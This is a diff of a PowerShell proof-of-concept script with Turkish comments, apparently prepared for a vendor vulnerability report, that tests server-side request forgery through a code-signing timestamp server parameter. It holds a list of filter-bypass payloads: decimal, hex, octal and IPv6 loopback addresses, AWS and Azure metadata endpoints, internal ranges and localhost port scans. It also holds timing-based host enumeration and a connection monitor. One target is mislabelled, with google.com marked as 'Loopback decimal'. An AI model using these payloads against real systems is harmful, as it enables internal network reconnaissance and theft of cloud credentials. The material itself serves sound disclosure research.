@@ -1,29 +1,48 @@
 # ============================================================
-# PoC: TimestampServer SSRF + IP Encoding Bypass
-# Hedef: SignatureHelper.cs - SignFile() fonksiyonu
-# Amaç: Internal host enumeration via hata kodu farkı
+# PoC v2: SSRF + Network Activity Monitor
 # ============================================================
 
-# --- HAZIRLIK ---
-# Test için self-signed code signing sertifikası oluştur
 $cert = New-SelfSignedCertificate `
     -Subject "CN=SSRF PoC Test" `
     -CertStoreLocation "Cert:\CurrentUser\My" `
     -KeyUsage DigitalSignature `
     -Type CodeSigningCert
 
-# İmzalanacak test dosyası
 $testFile = "$env:TEMP\ssrf_poc_test.ps1"
 "Write-Host 'PoC Test File'" | Set-Content $testFile
 
 # ============================================================
-# BÖLÜM 1: Baseline — Bilinen açık vs kapalı host farkı
+# Network Monitor — arka planda çalışır
+# ============================================================
+$monitorJob = Start-Job -ScriptBlock {
+    $hits = @()
+    $seen = @{}
+
+    while ($true) {
+        $conns = netstat -an 2>$null | Select-String "SYN_SENT|ESTABLISHED"
+        
+        foreach ($line in $conns) {
+            $str = $line.ToString().Trim()
+            if (-not $seen.ContainsKey($str)) {
+                $seen[$str] = $true
+                $hits += "[$(Get-Date -Format 'HH:mm:ss.fff')] $str"
+            }
+        }
+        Start-Sleep -Milliseconds 50
+    }
+} 
+
+Write-Host "[*] Network monitor başladı (Job ID: $($monitorJob.Id))" -ForegroundColor Cyan
+Start-Sleep -Milliseconds 500
+
+# ============================================================
+# Test Fonksiyonu
 # ============================================================
 function Test-SSRFTarget {
-    param(
-        [string]$Url,
-        [string]$Label
-    )
+    param([string]$Url, [string]$Label)
+
+    Write-Host "`n[>>] Testing: $Label" -ForegroundColor Yellow
+    Write-Host "     URL: $Url"
 
     $start = Get-Date
 
@@ -41,110 +60,68 @@ function Test-SSRFTarget {
             URL     = $Url
             Status  = $result.Status
             Elapsed = "$([math]::Round($elapsed))ms"
-            Error   = "none"
         }
     }
     catch {
         $elapsed = ((Get-Date) - $start).TotalMilliseconds
-
         [PSCustomObject]@{
             Label   = $Label
             URL     = $Url
-            Status  = "Exception"
+            Status  = "Exception: $($_.Exception.Message)"
             Elapsed = "$([math]::Round($elapsed))ms"
-            Error   = $_.Exception.Message
         }
     }
 }
 
 # ============================================================
-# BÖLÜM 2: IP Encoding Bypass Teknikleri
-# Bunların HEPSİ prefix kontrolünden geçer
+# Targets
 # ============================================================
 $targets = @(
-    # --- Standart ---
-    @{ Url = "http://127.0.0.1/";          Label = "Loopback - standard" },
-    @{ Url = "http://localhost/";           Label = "Loopback - hostname" },
-
-    # --- Decimal IP (bypass tekniği) ---
-    @{ Url = "http://2130706433/";          Label = "Loopback - decimal (2130706433 = 127.0.0.1)" },
-
-    # --- Hex IP (bypass tekniği) ---
-    @{ Url = "http://0x7f000001/";          Label = "Loopback - hex (0x7f000001 = 127.0.0.1)" },
-
-    # --- Octal IP (bypass tekniği) ---
-    @{ Url = "http://0177.0.0.1/";         Label = "Loopback - octal" },
-
-    # --- IPv6 ---
-    @{ Url = "http://[::1]/";              Label = "Loopback - IPv6" },
-    @{ Url = "http://[0:0:0:0:0:0:0:1]/"; Label = "Loopback - IPv6 full" },
-
-    # --- Cloud Metadata Endpoints ---
-    @{ Url = "http://169.254.169.254/";              Label = "AWS metadata" },
-    @{ Url = "http://169.254.169.254/latest/meta-data/"; Label = "AWS metadata path" },
-    @{ Url = "http://168.63.129.16/";                Label = "Azure metadata" },
-
-    # --- Internal Range Tarama ---
-    @{ Url = "http://192.168.1.1/";        Label = "Internal - gateway" },
-    @{ Url = "http://10.0.0.1/";           Label = "Internal - 10.x" },
-    @{ Url = "http://172.16.0.1/";         Label = "Internal - 172.16.x" },
-
-    # --- Port Tarama (localhost üzerinden) ---
-    @{ Url = "http://127.0.0.1:80/";       Label = "Port scan - 80" },
-    @{ Url = "http://127.0.0.1:443/";      Label = "Port scan - 443" },
-    @{ Url = "http://127.0.0.1:8080/";     Label = "Port scan - 8080" },
-    @{ Url = "http://127.0.0.1:3389/";     Label = "Port scan - RDP" },
-    @{ Url = "http://127.0.0.1:5985/";     Label = "Port scan - WinRM" },
-
-    # --- Var olmayan host (baseline/karşılaştırma) ---
-    @{ Url = "http://this-host-does-not-exist-xyz.local/"; Label = "Nonexistent host (baseline)" }
+    @{ Url = "http://127.0.0.1:80/";                      Label = "Loopback:80" },
+    @{ Url = "http://127.0.0.1:8080/";                    Label = "Loopback:8080" },
+    @{ Url = "http://google.com/";                         Label = "Loopback decimal" },
+    @{ Url = "http://0x7f000001/";                         Label = "Loopback hex" },
+    @{ Url = "http://169.254.169.254/latest/meta-data/";  Label = "AWS metadata" },
+    @{ Url = "http://this-host-does-not-exist-xyz.local/"; Label = "Nonexistent (baseline)" }
 )
 
-# ============================================================
-# BÖLÜM 3: Çalıştır ve Sonuçları Karşılaştır
-# ============================================================
-Write-Host "`n[*] SSRF PoC başlıyor..." -ForegroundColor Cyan
-Write-Host "[*] Kullanılan sertifika: $($cert.Subject)" -ForegroundColor Cyan
-Write-Host "[*] Test dosyası: $testFile`n" -ForegroundColor Cyan
-
-$results = foreach ($target in $targets) {
-    Write-Host "  Testing: $($target.Label)..." -NoNewline
-    $r = Test-SSRFTarget -Url $target.Url -Label $target.Label
-    Write-Host " [$($r.Elapsed)]" -ForegroundColor Yellow
-    $r
+$results = foreach ($t in $targets) {
+    Test-SSRFTarget -Url $t.Url -Label $t.Label
+    Start-Sleep -Milliseconds 200
 }
 
 # ============================================================
-# BÖLÜM 4: Analiz — Timing + Hata Kodu Farkı
+# Network Monitor Durdur ve Sonuçları Al
+# ============================================================
+Start-Sleep -Milliseconds 500
+Stop-Job $monitorJob
+$networkHits = Receive-Job $monitorJob
+Remove-Job $monitorJob
+
+# ============================================================
+# Rapor
 # ============================================================
 Write-Host "`n`n=== SONUÇLAR ===" -ForegroundColor Green
 $results | Format-Table -AutoSize
 
-# Timing bazlı ayrım
-Write-Host "`n=== TİMING ANALİZİ ===" -ForegroundColor Green
-Write-Host "Yüksek elapsed = host erişilebilir (bağlantı kuruldu, timeout beklendi)"
-Write-Host "Düşük elapsed  = host yok (hızlı DNS/TCP hatası)`n"
-
-$baseline = ($results | Where-Object { $_.Label -like "*Nonexistent*" }).Elapsed -replace "ms",""
-
-$results | ForEach-Object {
-    $ms = $_.Elapsed -replace "ms",""
-    $diff = [int]$ms - [int]$baseline
-
-    if ($diff -gt 500) {
-        Write-Host "[!] POTANSIYEL HIT: $($_.Label) — $($_.Elapsed) (+${diff}ms baseline'dan fazla)" `
-            -ForegroundColor Red
-    }
+Write-Host "`n=== NETWORK AKTİVİTESİ ===" -ForegroundColor Green
+if ($networkHits) {
+    $networkHits | ForEach-Object { Write-Host $_ -ForegroundColor Red }
+} else {
+    Write-Host "[-] Hiç TCP bağlantısı yakalanmadı" -ForegroundColor Gray
 }
 
 # ============================================================
-# BÖLÜM 5: MSRC Raporu için Kanıt Çıktısı
+# Wireshark için hatırlatma
 # ============================================================
-$reportPath = "$env:TEMP\ssrf_poc_report.txt"
-$results | Out-File $reportPath
-
-Write-Host "`n[*] Rapor kaydedildi: $reportPath" -ForegroundColor Cyan
+Write-Host "`n=== WİRESHARK İPUCU ===" -ForegroundColor Cyan
+Write-Host "Loopback trafiği için:"
+Write-Host "  Interface : 'Npcap Loopback Adapter' seç"
+Write-Host "  Filter    : tcp or udp port 80 or port 443 or port 318"
+Write-Host "Dış trafik için:"
+Write-Host "  Interface : aktif ethernet/wifi adapter"
+Write-Host "  Filter    : ip.dst != 192.168.0.0/16 and tcp"
 
 # Temizlik
 # Remove-Item $testFile -ErrorAction SilentlyContinue
-# Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -ErrorAction SilentlyContinue
+# Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)"
